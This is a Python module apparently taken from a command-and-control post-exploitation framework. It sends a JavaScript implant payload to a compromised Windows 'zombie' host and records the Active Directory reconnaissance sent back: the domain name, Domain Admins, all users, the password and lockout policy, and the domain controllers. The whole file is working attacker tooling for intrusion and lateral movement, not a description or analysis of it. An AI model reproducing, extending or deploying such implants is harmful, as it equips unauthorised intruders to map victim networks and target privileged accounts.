import core.implant

class EnumDomainInfoJob(core.job.Job):

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')
        task = handler.get_header("Header", False)

        if task == "Key":
            dkey = data.split("___")
            self.domain_key = tuple([i.lower() for i in dkey])
            if not self.domain_key in self.shell.domain_info:
                self.shell.domain_info[self.domain_key] = {}

            self.print_good("Detected Domain: "+dkey[0]+ " ("+dkey[1]+")")
            handler.reply(200)
            return

        if task == "Admins":
            domain_admins = data.split("___")[:-1]
            if not "Domain Admins" in self.shell.domain_info[self.domain_key]:
                self.shell.domain_info[self.domain_key]["Domain Admins"] = domain_admins

            da_string = "\n\t".join(domain_admins)
            self.print_good("Domain Admins:\n\t"+da_string)
            handler.reply(200)
            return

        if task == "Users":
            domain_users = data.split("___")[:-1]
            if not "Domain Users" in self.shell.domain_info[self.domain_key]:
                self.shell.domain_info[self.domain_key]["Domain Users"] = domain_users

            self.print_good("Domain Users retrieved: "+str(len(domain_users)))
            handler.reply(200)
            return

        if task == "PassPolicy":
            policy = data.split("___")
            if not "Password Policy" in self.shell.domain_info[self.domain_key]:
                self.shell.domain_info[self.domain_key]["Password Policy"] = policy

            policy_string =  "\tForce user logoff how long after time expires?:       %s\n"
            policy_string += "\tMinimum password age (days):                          %s\n"
            policy_string += "\tMaximum password age (days):                          %s\n"
            policy_string += "\tMinimum password length:                              %s\n"
            policy_string += "\tLength of password history maintained:                %s\n"
            policy_string += "\tLockout threshold:                                    %s\n"
            policy_string += "\tLockout duration (minutes):                           %s\n"
            policy_string += "\tLockout observation window (minutes):                 %s\n"
            policy_string = policy_string % tuple(policy)

            self.print_good("Domain Password Policy retrieved:\n"+policy_string)
            handler.reply(200)
            return

        if task == "DomainControllers":
            dcs = data.split("___")[:-2]
            print(dcs)
            dcs_expand = [dc.split("*") for dc in dcs]
            if not "Domain Controllers" in self.shell.domain_info[self.domain_key]:
                self.shell.domain_info[self.domain_key]["Domain Controllers"] = dcs_expand

            dc_string = "\n\t".join(["DC: %s (%s)" % tuple(dc) for dc in dcs_expand])
            self.print_good("Domain Controllers retrieved:\n\t"+dc_string)
            handler.reply(200)
            return

        if len(data) == 0:
            handler.reply(200)
            return

        if data == "Complete":
            super(EnumDomainInfoJob, self).report(handler, data)

        handler.reply(200)

    def done(self):
        self.display()

    def display(self):
        pass

class EnumDomainInfoImplant(core.implant.Implant):

    NAME = "Enumerate Domain Info"
    DESCRIPTION = "Enumerates information about the domain."
    AUTHORS = ["TheNaterz"]

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)

    def run(self):
        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/gather/enum_domain_info.js", self.options)

        self.dispatch(payloads, EnumDomainInfoJob)
